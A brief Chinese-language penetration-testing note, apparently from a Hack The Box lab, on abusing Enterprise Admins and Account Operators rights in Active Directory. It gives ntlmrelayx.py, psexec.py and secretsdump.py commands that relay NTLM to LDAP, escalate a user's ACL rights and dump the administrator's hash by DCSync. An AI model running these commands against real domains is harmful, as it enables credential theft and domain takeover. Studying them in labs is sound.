# Enterprise Admins

可实现ntml中继，也可以直接获取hash

组内的用户（DCSync）

与Account Operators搭配，创建一个属于这个组的用户

有时候需要借助于ntml中继

```clike
借助以下方法实现ntml中继（来实现DCSync攻击）
	1. 创建中继
ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user bigb0ss     ---创建中继，当访问smb,http等方式访问时会自动检验能否修改acl，如果能，那就自动修改了
	2. 访问服务（http,smb等）
psexec.py htb.local/bigb0ss:bigb0ss@10.10.14.39   
	3.然后就可以枚举了
secretsdump.py htb.local/bigb0ss:bigb0ss@10.10.10.161 -just-dc-user administrator
```

‍
